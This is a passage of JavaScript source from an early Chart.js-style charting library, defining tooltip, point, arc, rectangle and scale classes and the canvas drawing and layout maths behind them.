									stroke: element._saved.strokeColor || element.strokeColor


								});





							}, this);





							yMin = min(yPositions);


							yMax = max(yPositions);





							xMin = min(xPositions);


							xMax = max(xPositions);





							return {


								x: (xMin > this.chart.width/2) ? xMin : xMax,


								y: (yMin + yMax)/2


							};


						}).call(this, dataIndex);





					new Chart.MultiTooltip({


						x: medianPosition.x,


						y: medianPosition.y,


						xPadding: this.options.tooltipXPadding,


						yPadding: this.options.tooltipYPadding,


						xOffset: this.options.tooltipXOffset,


						fillColor: this.options.tooltipFillColor,


						textColor: this.options.tooltipFontColor,


						fontFamily: this.options.tooltipFontFamily,


						fontStyle: this.options.tooltipFontStyle,


						fontSize: this.options.tooltipFontSize,


						titleTextColor: this.options.tooltipTitleFontColor,


						titleFontFamily: this.options.tooltipTitleFontFamily,


						titleFontStyle: this.options.tooltipTitleFontStyle,


						titleFontSize: this.options.tooltipTitleFontSize,


						cornerRadius: this.options.tooltipCornerRadius,


						labels: tooltipLabels,


						legendColors: tooltipColors,


						legendColorBackground : this.options.multiTooltipKeyBackground,


						title: template(this.options.tooltipTitleTemplate,ChartElements[0]),


						chart: this.chart,


						ctx: this.chart.ctx,


						custom: this.options.customTooltips


					}).draw();





				} else {


					each(ChartElements, function(Element) {


						var tooltipPosition = Element.tooltipPosition();


						new Chart.Tooltip({


							x: Math.round(tooltipPosition.x),


							y: Math.round(tooltipPosition.y),


							xPadding: this.options.tooltipXPadding,


							yPadding: this.options.tooltipYPadding,


							fillColor: this.options.tooltipFillColor,


							textColor: this.options.tooltipFontColor,


							fontFamily: this.options.tooltipFontFamily,


							fontStyle: this.options.tooltipFontStyle,


							fontSize: this.options.tooltipFontSize,


							caretHeight: this.options.tooltipCaretSize,


							cornerRadius: this.options.tooltipCornerRadius,


							text: template(this.options.tooltipTemplate, Element),


							chart: this.chart,


							custom: this.options.customTooltips


						}).draw();


					}, this);


				}


			}


			return this;


		},


		toBase64Image : function(){


			return this.chart.canvas.toDataURL.apply(this.chart.canvas, arguments);


		}


	});





	Chart.Type.extend = function(extensions){





		var parent = this;





		var ChartType = function(){


			return parent.apply(this,arguments);


		};





		/* Copy the prototype object of the this class */


		ChartType.prototype = clone(parent.prototype);


		/* Now overwrite some of the properties in the base class with the new extensions */


		extend(ChartType.prototype, extensions);





		ChartType.extend = Chart.Type.extend;





		if (extensions.name || parent.prototype.name){





			var chartName = extensions.name || parent.prototype.name;


			/* Assign any potential default values of the new chart type */





			//If none are defined, we'll use a clone of the chart type this is being extended from.


			//I.e. if we extend a line chart, we'll use the defaults from the line chart if our new chart


			//doesn't define some defaults of their own.





			var baseDefaults = (Chart.defaults[parent.prototype.name]) ? clone(Chart.defaults[parent.prototype.name]) : {};





			Chart.defaults[chartName] = extend(baseDefaults,extensions.defaults);





			Chart.types[chartName] = ChartType;





			//Register this new chart type in the Chart prototype


			Chart.prototype[chartName] = function(data,options){


				var config = merge(Chart.defaults.global, Chart.defaults[chartName], options || {});


				return new ChartType(data,config,this);


			};


		} else{


			warn("Name not provided for this chart, so it hasn't been registered");


		}


		return parent;


	};





	Chart.Element = function(configuration){


		extend(this,configuration);


		this.initialize.apply(this,arguments);


		this.save();


	};


	extend(Chart.Element.prototype,{


		initialize : function(){},


		restore : function(props){


			if (!props){


				extend(this,this._saved);


			} else {


				each(props,function(key){


					this[key] = this._saved[key];


				},this);


			}


			return this;


		},


		save : function(){


			this._saved = clone(this);


			delete this._saved._saved;


			return this;


		},


		update : function(newProps){


			each(newProps,function(value,key){


				this._saved[key] = this[key];


				this[key] = value;


			},this);


			return this;


		},


		transition : function(props,ease){


			each(props,function(value,key){


				this[key] = ((value - this._saved[key]) * ease) + this._saved[key];


			},this);


			return this;


		},


		tooltipPosition : function(){


			return {


				x : this.x,


				y : this.y


			};


		},


		hasValue: function(){


			return isNumber(this.value);


		}


	});





	Chart.Element.extend = inherits;








	Chart.Point = Chart.Element.extend({


		display: true,


		inRange: function(chartX,chartY){


			var hitDetectionRange = this.hitDetectionRadius + this.radius;


			return ((Math.pow(chartX-this.x, 2)+Math.pow(chartY-this.y, 2)) < Math.pow(hitDetectionRange,2));


		},


		draw : function(){


			if (this.display){


				var ctx = this.ctx;


				ctx.beginPath();





				ctx.arc(this.x, this.y, this.radius, 0, Math.PI*2);


				ctx.closePath();





				ctx.strokeStyle = this.strokeColor;


				ctx.lineWidth = this.strokeWidth;





				ctx.fillStyle = this.fillColor;





				ctx.fill();


				ctx.stroke();


			}








			//Quick debug for bezier curve splining


			//Highlights control points and the line between them.


			//Handy for dev - stripped in the min version.





			// ctx.save();


			// ctx.fillStyle = "black";


			// ctx.strokeStyle = "black"


			// ctx.beginPath();


			// ctx.arc(this.controlPoints.inner.x,this.controlPoints.inner.y, 2, 0, Math.PI*2);


			// ctx.fill();





			// ctx.beginPath();


			// ctx.arc(this.controlPoints.outer.x,this.controlPoints.outer.y, 2, 0, Math.PI*2);


			// ctx.fill();





			// ctx.moveTo(this.controlPoints.inner.x,this.controlPoints.inner.y);


			// ctx.lineTo(this.x, this.y);


			// ctx.lineTo(this.controlPoints.outer.x,this.controlPoints.outer.y);


			// ctx.stroke();





			// ctx.restore();











		}


	});





	Chart.Arc = Chart.Element.extend({


		inRange : function(chartX,chartY){





			var pointRelativePosition = helpers.getAngleFromPoint(this, {


				x: chartX,


				y: chartY


			});





			// Normalize all angles to 0 - 2*PI (0 - 360°)


			var pointRelativeAngle = pointRelativePosition.angle % (Math.PI * 2),


			    startAngle = (Math.PI * 2 + this.startAngle) % (Math.PI * 2),


			    endAngle = (Math.PI * 2 + this.endAngle) % (Math.PI * 2) || 360;





			// Calculate wether the pointRelativeAngle is between the start and the end angle


			var betweenAngles = (endAngle < startAngle) ?


				pointRelativeAngle <= endAngle || pointRelativeAngle >= startAngle:


				pointRelativeAngle >= startAngle && pointRelativeAngle <= endAngle;





			//Check if within the range of the open/close angle


			var withinRadius = (pointRelativePosition.distance >= this.innerRadius && pointRelativePosition.distance <= this.outerRadius);





			return (betweenAngles && withinRadius);


			//Ensure within the outside of the arc centre, but inside arc outer


		},


		tooltipPosition : function(){


			var centreAngle = this.startAngle + ((this.endAngle - this.startAngle) / 2),


				rangeFromCentre = (this.outerRadius - this.innerRadius) / 2 + this.innerRadius;


			return {


				x : this.x + (Math.cos(centreAngle) * rangeFromCentre),


				y : this.y + (Math.sin(centreAngle) * rangeFromCentre)


			};


		},


		draw : function(animationPercent){





			var easingDecimal = animationPercent || 1;





			var ctx = this.ctx;





			ctx.beginPath();





			ctx.arc(this.x, this.y, this.outerRadius < 0 ? 0 : this.outerRadius, this.startAngle, this.endAngle);





            ctx.arc(this.x, this.y, this.innerRadius < 0 ? 0 : this.innerRadius, this.endAngle, this.startAngle, true);





			ctx.closePath();


			ctx.strokeStyle = this.strokeColor;


			ctx.lineWidth = this.strokeWidth;





			ctx.fillStyle = this.fillColor;





			ctx.fill();


			ctx.lineJoin = 'bevel';





			if (this.showStroke){


				ctx.stroke();


			}


		}


	});





	Chart.Rectangle = Chart.Element.extend({


		draw : function(){


			var ctx = this.ctx,


				halfWidth = this.width/2,


				leftX = this.x - halfWidth,


				rightX = this.x + halfWidth,


				top = this.base - (this.base - this.y),


				halfStroke = this.strokeWidth / 2;





			// Canvas doesn't allow us to stroke inside the width so we can


			// adjust the sizes to fit if we're setting a stroke on the line


			if (this.showStroke){


				leftX += halfStroke;


				rightX -= halfStroke;


				top += halfStroke;


			}





			ctx.beginPath();





			ctx.fillStyle = this.fillColor;


			ctx.strokeStyle = this.strokeColor;


			ctx.lineWidth = this.strokeWidth;





			// It'd be nice to keep this class totally generic to any rectangle


			// and simply specify which border to miss out.


			ctx.moveTo(leftX, this.base);


			ctx.lineTo(leftX, top);


			ctx.lineTo(rightX, top);


			ctx.lineTo(rightX, this.base);


			ctx.fill();


			if (this.showStroke){


				ctx.stroke();


			}


		},


		height : function(){


			return this.base - this.y;


		},


		inRange : function(chartX,chartY){


			return (chartX >= this.x - this.width/2 && chartX <= this.x + this.width/2) && (chartY >= this.y && chartY <= this.base);


		}


	});





	Chart.Animation = Chart.Element.extend({


		currentStep: null, // the current animation step


		numSteps: 60, // default number of steps


		easing: "", // the easing to use for this animation


		render: null, // render function used by the animation service


		


		onAnimationProgress: null, // user specified callback to fire on each step of the animation 


		onAnimationComplete: null, // user specified callback to fire when the animation finishes


	});


	


	Chart.Tooltip = Chart.Element.extend({


		draw : function(){





			var ctx = this.chart.ctx;





			ctx.font = fontString(this.fontSize,this.fontStyle,this.fontFamily);





			this.xAlign = "center";


			this.yAlign = "above";





			//Distance between the actual element.y position and the start of the tooltip caret


			var caretPadding = this.caretPadding = 2;





			var tooltipWidth = ctx.measureText(this.text).width + 2*this.xPadding,


				tooltipRectHeight = this.fontSize + 2*this.yPadding,


				tooltipHeight = tooltipRectHeight + this.caretHeight + caretPadding;





			if (this.x + tooltipWidth/2 >this.chart.width){


				this.xAlign = "left";


			} else if (this.x - tooltipWidth/2 < 0){


				this.xAlign = "right";


			}





			if (this.y - tooltipHeight < 0){


				this.yAlign = "below";


			}








			var tooltipX = this.x - tooltipWidth/2,


				tooltipY = this.y - tooltipHeight;





			ctx.fillStyle = this.fillColor;





			// Custom Tooltips


			if(this.custom){


				this.custom(this);


			}


			else{


				switch(this.yAlign)


				{


				case "above":


					//Draw a caret above the x/y


					ctx.beginPath();


					ctx.moveTo(this.x,this.y - caretPadding);


					ctx.lineTo(this.x + this.caretHeight, this.y - (caretPadding + this.caretHeight));


					ctx.lineTo(this.x - this.caretHeight, this.y - (caretPadding + this.caretHeight));


					ctx.closePath();


					ctx.fill();


					break;


				case "below":


					tooltipY = this.y + caretPadding + this.caretHeight;


					//Draw a caret below the x/y


					ctx.beginPath();


					ctx.moveTo(this.x, this.y + caretPadding);


					ctx.lineTo(this.x + this.caretHeight, this.y + caretPadding + this.caretHeight);


					ctx.lineTo(this.x - this.caretHeight, this.y + caretPadding + this.caretHeight);


					ctx.closePath();


					ctx.fill();


					break;


				}





				switch(this.xAlign)


				{


				case "left":


					tooltipX = this.x - tooltipWidth + (this.cornerRadius + this.caretHeight);


					break;


				case "right":


					tooltipX = this.x - (this.cornerRadius + this.caretHeight);


					break;


				}





				drawRoundedRectangle(ctx,tooltipX,tooltipY,tooltipWidth,tooltipRectHeight,this.cornerRadius);





				ctx.fill();





				ctx.fillStyle = this.textColor;


				ctx.textAlign = "center";


				ctx.textBaseline = "middle";


				ctx.fillText(this.text, tooltipX + tooltipWidth/2, tooltipY + tooltipRectHeight/2);


			}


		}


	});





	Chart.MultiTooltip = Chart.Element.extend({


		initialize : function(){


			this.font = fontString(this.fontSize,this.fontStyle,this.fontFamily);





			this.titleFont = fontString(this.titleFontSize,this.titleFontStyle,this.titleFontFamily);





			this.titleHeight = this.title ? this.titleFontSize * 1.5 : 0;


			this.height = (this.labels.length * this.fontSize) + ((this.labels.length-1) * (this.fontSize/2)) + (this.yPadding*2) + this.titleHeight;





			this.ctx.font = this.titleFont;





			var titleWidth = this.ctx.measureText(this.title).width,


				//Label has a legend square as well so account for this.


				labelWidth = longestText(this.ctx,this.font,this.labels) + this.fontSize + 3,


				longestTextWidth = max([labelWidth,titleWidth]);





			this.width = longestTextWidth + (this.xPadding*2);








			var halfHeight = this.height/2;





			//Check to ensure the height will fit on the canvas


			if (this.y - halfHeight < 0 ){


				this.y = halfHeight;


			} else if (this.y + halfHeight > this.chart.height){


				this.y = this.chart.height - halfHeight;


			}





			//Decide whether to align left or right based on position on canvas


			if (this.x > this.chart.width/2){


				this.x -= this.xOffset + this.width;


			} else {


				this.x += this.xOffset;


			}








		},


		getLineHeight : function(index){


			var baseLineHeight = this.y - (this.height/2) + this.yPadding,


				afterTitleIndex = index-1;





			//If the index is zero, we're getting the title


			if (index === 0){


				return baseLineHeight + this.titleHeight / 3;


			} else{


				return baseLineHeight + ((this.fontSize * 1.5 * afterTitleIndex) + this.fontSize / 2) + this.titleHeight;


			}





		},


		draw : function(){


			// Custom Tooltips


			if(this.custom){


				this.custom(this);


			}


			else{


				drawRoundedRectangle(this.ctx,this.x,this.y - this.height/2,this.width,this.height,this.cornerRadius);


				var ctx = this.ctx;


				ctx.fillStyle = this.fillColor;


				ctx.fill();


				ctx.closePath();





				ctx.textAlign = "left";


				ctx.textBaseline = "middle";


				ctx.fillStyle = this.titleTextColor;


				ctx.font = this.titleFont;





				ctx.fillText(this.title,this.x + this.xPadding, this.getLineHeight(0));





				ctx.font = this.font;


				helpers.each(this.labels,function(label,index){


					ctx.fillStyle = this.textColor;


					ctx.fillText(label,this.x + this.xPadding + this.fontSize + 3, this.getLineHeight(index + 1));





					//A bit gnarly, but clearing this rectangle breaks when using explorercanvas (clears whole canvas)


					//ctx.clearRect(this.x + this.xPadding, this.getLineHeight(index + 1) - this.fontSize/2, this.fontSize, this.fontSize);


					//Instead we'll make a white filled block to put the legendColour palette over.





					ctx.fillStyle = this.legendColorBackground;


					ctx.fillRect(this.x + this.xPadding, this.getLineHeight(index + 1) - this.fontSize/2, this.fontSize, this.fontSize);





					ctx.fillStyle = this.legendColors[index].fill;


					ctx.fillRect(this.x + this.xPadding, this.getLineHeight(index + 1) - this.fontSize/2, this.fontSize, this.fontSize);








				},this);


			}


		}


	});





	Chart.Scale = Chart.Element.extend({


		initialize : function(){


			this.fit();


		},


		buildYLabels : function(){


			this.yLabels = [];





			var stepDecimalPlaces = getDecimalPlaces(this.stepValue);





			for (var i=0; i<=this.steps; i++){


				this.yLabels.push(template(this.templateString,{value:(this.min + (i * this.stepValue)).toFixed(stepDecimalPlaces)}));


			}


			this.yLabelWidth = (this.display && this.showLabels) ? longestText(this.ctx,this.font,this.yLabels) + 10 : 0;


		},


		addXLabel : function(label){


			this.xLabels.push(label);


			this.valuesCount++;


			this.fit();


		},


		removeXLabel : function(){


			this.xLabels.shift();


			this.valuesCount--;


			this.fit();


		},


		// Fitting loop to rotate x Labels and figure out what fits there, and also calculate how many Y steps to use


		fit: function(){


			// First we need the width of the yLabels, assuming the xLabels aren't rotated





			// To do that we need the base line at the top and base of the chart, assuming there is no x label rotation


			this.startPoint = (this.display) ? this.fontSize : 0;


			this.endPoint = (this.display) ? this.height - (this.fontSize * 1.5) - 5 : this.height; // -5 to pad labels





			// Apply padding settings to the start and end point.


			this.startPoint += this.padding;


			this.endPoint -= this.padding;





			// Cache the starting endpoint, excluding the space for x labels


			var cachedEndPoint = this.endPoint;





			// Cache the starting height, so can determine if we need to recalculate the scale yAxis


			var cachedHeight = this.endPoint - this.startPoint,


				cachedYLabelWidth;





			// Build the current yLabels so we have an idea of what size they'll be to start


			/*


			 *	This sets what is returned from calculateScaleRange as static properties of this class:


			 *


				this.steps;


				this.stepValue;


				this.min;


				this.max;


			 *


			 */


			this.calculateYRange(cachedHeight);





			// With these properties set we can now build the array of yLabels


			// and also the width of the largest yLabel


			this.buildYLabels();





			this.calculateXLabelRotation();





			while((cachedHeight > this.endPoint - this.startPoint)){


				cachedHeight = this.endPoint - this.startPoint;


				cachedYLabelWidth = this.yLabelWidth;





				this.calculateYRange(cachedHeight);


				this.buildYLabels();





				// Only go through the xLabel loop again if the yLabel width has changed


				if (cachedYLabelWidth < this.yLabelWidth){


					this.endPoint = cachedEndPoint;


					this.calculateXLabelRotation();


				}


			}





		},


		calculateXLabelRotation : function(){


			//Get the width of each grid by calculating the difference


			//between x offsets between 0 and 1.





			this.ctx.font = this.font;





			var firstWidth = this.ctx.measureText(this.xLabels[0]).width,


				lastWidth = this.ctx.measureText(this.xLabels[this.xLabels.length - 1]).width,


				firstRotated,


				lastRotated;








			this.xScalePaddingRight = lastWidth/2 + 3;


			this.xScalePaddingLeft = (firstWidth/2 > this.yLabelWidth) ? firstWidth/2 : this.yLabelWidth;





			this.xLabelRotation = 0;


			if (this.display){


				var originalLabelWidth = longestText(this.ctx,this.font,this.xLabels),


					cosRotation,


					firstRotatedWidth;


				this.xLabelWidth = originalLabelWidth;


				//Allow 3 pixels x2 padding either side for label readability


				var xGridWidth = Math.floor(this.calculateX(1) - this.calculateX(0)) - 6;





				//Max label rotate should be 90 - also act as a loop counter


				while ((this.xLabelWidth > xGridWidth && this.xLabelRotation === 0) || (this.xLabelWidth > xGridWidth && this.xLabelRotation <= 90 && this.xLabelRotation > 0)){


					cosRotation = Math.cos(toRadians(this.xLabelRotation));





					firstRotated = cosRotation * firstWidth;


					lastRotated = cosRotation * lastWidth;





					// We're right aligning the text now.


					if (firstRotated + this.fontSize / 2 > this.yLabelWidth){


						this.xScalePaddingLeft = firstRotated + this.fontSize / 2;


					}


					this.xScalePaddingRight = this.fontSize/2;








					this.xLabelRotation++;


					this.xLabelWidth = cosRotation * originalLabelWidth;





				}


				if (this.xLabelRotation > 0){


					this.endPoint -= Math.sin(toRadians(this.xLabelRotation))*originalLabelWidth + 3;


				}


			}


			else{


				this.xLabelWidth = 0;


				this.xScalePaddingRight = this.padding;


				this.xScalePaddingLeft = this.padding;


			}





		},


		// Needs to be overidden in each Chart type


		// Otherwise we need to pass all the data into the scale class


		calculateYRange: noop,


		drawingArea: function(){


			return this.startPoint - this.endPoint;


		},


		calculateY : function(value){


			var scalingFactor = this.drawingArea() / (this.min - this.max);


			return this.endPoint - (scalingFactor * (value - this.min));


		},


		calculateX : function(index){


			var isRotated = (this.xLabelRotation > 0),


				// innerWidth = (this.offsetGridLines) ? this.width - offsetLeft - this.padding : this.width - (offsetLeft + halfLabelWidth * 2) - this.padding,


				innerWidth = this.width - (this.xScalePaddingLeft + this.xScalePaddingRight),


				valueWidth = innerWidth/Math.max((this.valuesCount - ((this.offsetGridLines) ? 0 : 1)), 1),


				valueOffset = (valueWidth * index) + this.xScalePaddingLeft;





			if (this.offsetGridLines){


				valueOffset += (valueWidth/2);


			}





			return Math.round(valueOffset);


		},


		update : function(newProps){


			helpers.extend(this, newProps);


			this.fit();


		},


		draw : function(){


			var ctx = this.ctx,


				yLabelGap = (this.endPoint - this.startPoint) / this.steps,


				xStart = Math.round(this.xScalePaddingLeft);


			if (this.display){


				ctx.fillStyle = this.textColor;


				ctx.font = this.font;


				each(this.yLabels,function(labelString,index){


					var yLabelCenter = this.endPoint - (yLabelGap * index),


						linePositionY = Math.round(yLabelCenter),


						drawHorizontalLine = this.showHorizontalLines;





					ctx.textAlign = "right";


					ctx.textBaseline = "middle";


					if (this.showLabels){


						ctx.fillText(labelString,xStart - 10,yLabelCenter);


					}





					// This is X axis, so draw it


					if (index === 0 && !drawHorizontalLine){


						drawHorizontalLine = true;


					}





					if (drawHorizontalLine){


						ctx.beginPath();


					}





					if (index > 0){


						// This is a grid line in the centre, so drop that


						ctx.lineWidth = this.gridLineWidth;


						ctx.strokeStyle = this.gridLineColor;


					} else {


						// This is the first line on the scale


						ctx.lineWidth = this.lineWidth;


						ctx.strokeStyle = this.lineColor;


					}





					linePositionY += helpers.aliasPixel(ctx.lineWidth);





					if(drawHorizontalLine){


						ctx.moveTo(xStart, linePositionY);


						ctx.lineTo(this.width, linePositionY);


						ctx.stroke();


						ctx.closePath();


					}





					ctx.lineWidth = this.lineWidth;


					ctx.strokeStyle = this.lineColor;


					ctx.beginPath();


					ctx.moveTo(xStart - 5, linePositionY);


					ctx.lineTo(xStart, linePositionY);


					ctx.stroke();


					ctx.closePath();





				},this);





				each(this.xLabels,function(label,index){


					var xPos = this.calculateX(index) + aliasPixel(this.lineWidth),


						// Check to see if line/bar here and decide where to place the line


						linePos = this.calculateX(index - (this.offsetGridLines ? 0.5 : 0)) + aliasPixel(this.lineWidth),


						isRotated = (this.xLabelRotation > 0),


						drawVerticalLine = this.showVerticalLines;





					// This is Y axis, so draw it


					if (index === 0 && !drawVerticalLine){


						drawVerticalLine = true;


					}





					if (drawVerticalLine){


						ctx.beginPath();


					}





					if (index > 0){


						// This is a grid line in the centre, so drop that


						ctx.lineWidth = this.gridLineWidth;


						ctx.strokeStyle = this.gridLineColor;


					} else {


						// This is the first line on the scale


						ctx.lineWidth = this.lineWidth;


						ctx.strokeStyle = this.lineColor;


					}





					if (drawVerticalLine){


						ctx.moveTo(linePos,this.endPoint);


						ctx.lineTo(linePos,this.startPoint - 3);


						ctx.stroke();


						ctx.closePath();


					}








					ctx.lineWidth = this.lineWidth;


					ctx.strokeStyle = this.lineColor;








					// Small lines at the bottom of the base grid line


					ctx.beginPath();


					ctx.moveTo(linePos,this.endPoint);


					ctx.lineTo(linePos,this.endPoint + 5);


					ctx.stroke();


					ctx.closePath();





					ctx.save();


					ctx.translate(xPos,(isRotated) ? this.endPoint + 12 : this.endPoint + 8);


					ctx.rotate(toRadians(this.xLabelRotation)*-1);


					ctx.font = this.font;


					ctx.textAlign = (isRotated) ? "right" : "center";


					ctx.textBaseline = (isRotated) ? "middle" : "top";


					ctx.fillText(label, 0, 0);


					ctx.restore();


				},this);





			}


		}





	});





	Chart.RadialScale = Chart.Element.extend({


		initialize: function(){


			this.size = min([this.height, this.width]);


			this.drawingArea = (this.display) ? (this.size/2) - (this.fontSize/2 + this.backdropPaddingY) : (this.size/2);


		},


		calculateCenterOffset: function(value){


			// Take into account half font size + the yPadding of the top value


			var scalingFactor = this.drawingArea / (this.max - this.min);





			return (value - this.min) * scalingFactor;


		},


		update : function(){


			if (!this.lineArc){


				this.setScaleSize();


			} else {


				this.drawingArea = (this.display) ? (this.size/2) - (this.fontSize/2 + this.backdropPaddingY) : (this.size/2);


			}


			this.buildYLabels();


		},


		buildYLabels: function(){


			this.yLabels = [];





			var stepDecimalPlaces = getDecimalPlaces(this.stepValue);





			for (var i=0; i<=this.steps; i++){


				this.yLabels.push(template(this.templateString,{value:(this.min + (i * this.stepValue)).toFixed(stepDecimalPlaces)}));


			}


		},


		getCircumference : function(){


			return ((Math.PI*2) / this.valuesCount);


		},


		setScaleSize: function(){


			/*


			 * Right, this is really confusing and there is a lot of maths going on here


			 * The gist of the problem is here: https://gist.github.com/nnnick/696cc9c55f4b0beb8fe9


			 *


			 * Reaction: https://dl.dropboxusercontent.com/u/34601363/toomuchscience.gif


			 *


			 * Solution:


			 *


			 * We assume the radius of the polygon is half the size of the canvas at first


			 * at each index we check if the text overlaps.


			 *


			 * Where it does, we store that angle and that index.


			 *


			 * After finding the largest index and angle we calculate how much we need to remove


			 * from the shape radius to move the point inwards by that x.


			 *


			 * We average the left and right distances to get the maximum shape radius that can fit in the box


			 * along with labels.


			 *


			 * Once we have that, we can find the centre point for the chart, by taking the x text protrusion


			 * on each side, removing that from the size, halving it and adding the left x protrusion width.


			 *


			 * This will mean we have a shape fitted to the canvas, as large as it can be with the labels


			 * and position it in the most space efficient manner


			 *


			 * https://dl.dropboxusercontent.com/u/34601363/yeahscience.gif


			 */








			// Get maximum radius of the polygon. Either half the height (minus the text width) or half the width.


			// Use this to calculate the offset + change. - Make sure L/R protrusion is at least 0 to stop issues with centre points


			var largestPossibleRadius = min([(this.height/2 - this.pointLabelFontSize - 5), this.width/2]),


				pointPosition,


				i,


				textWidth,


				halfTextWidth,


				furthestRight = this.width,


				furthestRightIndex,


				furthestRightAngle,


				furthestLeft = 0,


				furthestLeftIndex,


				furthestLeftAngle,


				xProtrusionLeft,


				xProtrusionRight,


				radiusReductionRight,


				radiusReductionLeft,


				maxWidthRadius;


			this.ctx.font = fontString(this.pointLabelFontSize,this.pointLabelFontStyle,this.pointLabelFontFamily);


			for (i=0;i<this.valuesCount;i++){


				// 5px to space the text slightly out - similar to what we do in the draw function.


				pointPosition = this.getPointPosition(i, largestPossibleRadius);


				textWidth = this.ctx.measureText(template(this.templateString, { value: this.labels[i] })).width + 5;


				if (i === 0 || i === this.valuesCount/2){


					// If we're at index zero, or exactly the middle, we're at exactly the top/bottom


					// of the radar chart, so text will be aligned centrally, so we'll half it and compare


					// w/left and right text sizes


					halfTextWidth = textWidth/2;


					if (pointPosition.x + halfTextWidth > furthestRight) {


						furthestRight = pointPosition.x + halfTextWidth;


						furthestRightIndex = i;


					}


					if (pointPosition.x - halfTextWidth < furthestLeft) {


						furthestLeft = pointPosition.x - halfTextWidth;


						furthestLeftIndex = i;


					}


				}


				else if (i < this.valuesCount/2) {


					// Less than half the values means we'll left align the text


					if (pointPosition.x + textWidth > furthestRight) {


						furthestRight = pointPosition.x + textWidth;


						furthestRightIndex = i;


					}


				}


				else if (i > this.valuesCount/2){


					// More than half the values means we'll right align the text


					if (pointPosition.x - textWidth < furthestLeft) {


						furthestLeft = pointPosition.x - textWidth;


						furthestLeftIndex = i;


					}


				}


			}





			xProtrusionLeft = furthestLeft;





			xProtrusionRight = Math.ceil(furthestRight - this.width);





			furthestRightAngle = this.getIndexAngle(furthestRightIndex);





			furthestLeftAngle = this.getIndexAngle(furthestLeftIndex);





			radiusReductionRight = xProtrusionRight / Math.sin(furthestRightAngle + Math.PI/2);





			radiusReductionLeft = xProtrusionLeft / Math.sin(furthestLeftAngle + Math.PI/2);





			// Ensure we actually need to reduce the size of the chart


			radiusReductionRight = (isNumber(radiusReductionRight)) ? radiusReductionRight : 0;


			radiusReductionLeft = (isNumber(radiusReductionLeft)) ? radiusReductionLeft : 0;





			this.drawingArea = largestPossibleRadius - (radiusReductionLeft + radiusReductionRight)/2;





			//this.drawingArea = min([maxWidthRadius, (this.height - (2 * (this.pointLabelFontSize + 5)))/2])


			this.setCenterPoint(radiusReductionLeft, radiusReductionRight);





		},


		setCenterPoint: function(leftMovement, rightMovement){





			var maxRight = this.width - rightMovement - this.drawingArea,


				maxLeft = leftMovement + this.drawingArea;





			this.xCenter = (maxLeft + maxRight)/2;


			// Always vertically in the centre as the text height doesn't change


			this.yCenter = (this.height/2);


		},





		getIndexAngle : function(index){


			var angleMultiplier = (Math.PI * 2) / this.valuesCount;


			// Start from the top instead of right, so remove a quarter of the circle





			return index * angleMultiplier - (Math.PI/2);


		},


		getPointPosition : function(index, distanceFromCenter){


			var thisAngle = this.getIndexAngle(index);


			return {


				x : (Math.cos(thisAngle) * distanceFromCenter) + this.xCenter,


				y : (Math.sin(thisAngle) * distanceFromCenter) + this.yCenter


			};


		},


		draw: function(){


			if (this.display){


				var ctx = this.ctx;


				each(this.yLabels, function(label, index){


					// Don't draw a centre value


					if (index > 0){


						var yCenterOffset = index * (this.drawingArea/this.steps),


							yHeight = this.yCenter - yCenterOffset,


							pointPosition;





						// Draw circular lines around the scale


						if (this.lineWidth > 0){


							ctx.strokeStyle = this.lineColor;


							ctx.lineWidth = this.lineWidth;





							if(this.lineArc){


								ctx.beginPath();


								ctx.arc(this.xCenter, this.yCenter, yCenterOffset, 0, Math.PI*2);


								ctx.closePath();


								ctx.stroke();


							} else{


								ctx.beginPath();


								for (var i=0;i<this.valuesCount;i++)


								{


									pointPosition = this.getPointPosition(i, this.calculateCenterOffset(this.min + (index * this.stepValue)));


									if (i === 0){


										ctx.moveTo(pointPosition.x, pointPosition.y);


									} else {


										ctx.lineTo(pointPosition.x, pointPosition.y);


									}


								}


								ctx.closePath();


								ctx.stroke();


							}


						}


						if(this.showLabels){


							ctx.font = fontString(this.fontSize,this.fontStyle,this.fontFamily);


							if (this.showLabelBackdrop){


								var labelWidth = ctx.measureText(label).width;


								ctx.fillStyle = this.backdropColor;


								ctx.fillRect(


									this.xCenter - labelWidth/2 - this.backdropPaddingX,


									yHeight - this.fontSize/2 - this.backdropPaddingY,


									labelWidth + this.backdropPaddingX*2,


									this.fontSize + this.backdropPaddingY*2


								);


							}


							ctx.textAlign = 'center';


							ctx.textBaseline = "middle";


							ctx.fillStyle = this.fontColor;


							ctx.fillText(label, this.xCenter, yHeight);


						}


					}


				}, this);





				if (!this.lineArc){


					ctx.lineWidth = this.angleLineWidth;


					ctx.strokeStyle = this.angleLineColor;


					for (var i = this.valuesCount - 1; i >= 0; i--) {


						var centerOffset = null, outerPosition = null;





						if (this.angleLineWidth > 0){


							centerOffset = this.calculateCenterOffset(this.max);


							outerPosition = this.getPointPosition(i, centerOffset);


							ctx.beginPath();


							ctx.moveTo(this.xCenter, this.yCenter);


							ctx.lineTo(outerPosition.x, outerPosition.y);


							ctx.stroke();


							ctx.closePath();


						}





						if (this.backgroundColors && this.backgroundColors.length == this.valuesCount) {


							if (centerOffset == null)


								centerOffset = this.calculateCenterOffset(this.max);





							if (outerPosition == null)


								outerPosition = this.getPointPosition(i, centerOffset);





							var previousOuterPosition = this.getPointPosition(i === 0 ? this.valuesCount - 1 : i - 1, centerOffset);


							var nextOuterPosition = this.getPointPosition(i === this.valuesCount - 1 ? 0 : i + 1, centerOffset);





							var previousOuterHalfway = { x: (previousOuterPosition.x + outerPosition.x) / 2, y: (previousOuterPosition.y + outerPosition.y) / 2 };


							var nextOuterHalfway = { x: (outerPosition.x + nextOuterPosition.x) / 2, y: (outerPosition.y + nextOuterPosition.y) / 2 };





							ctx.beginPath();


							ctx.moveTo(this.xCenter, this.yCenter);


							ctx.lineTo(previousOuterHalfway.x, previousOuterHalfway.y);


							ctx.lineTo(outerPosition.x, outerPosition.y);


							ctx.lineTo(nextOuterHalfway.x, nextOuterHalfway.y);


							ctx.fillStyle = this.backgroundColors[i];


							ctx.fill();


							ctx.closePath();


						}


						// Extra 3px out for some label spacing


						var pointLabelPosition = this.getPointPosition(i, this.calculateCenterOffset(this.max) + 5);


						ctx.font = fontString(this.pointLabelFontSize,this.pointLabelFontStyle,this.pointLabelFontFamily);


						ctx.fillStyle = this.pointLabelFontColor;





						var labelsCount = this.labels.length,


							halfLabelsCount = this.labels.length/2,


							quarterLabelsCount = halfLabelsCount/2,


							upperHalf = (i < quarterLabelsCount || i > labelsCount - quarterLabelsCount),


							exactQuarter = (i === quarterLabelsCount || i === labelsCount - quarterLabelsCount);


						if (i === 0){


							ctx.textAlign = 'center';


						} else if(i === halfLabelsCount){


							ctx.textAlign = 'center';


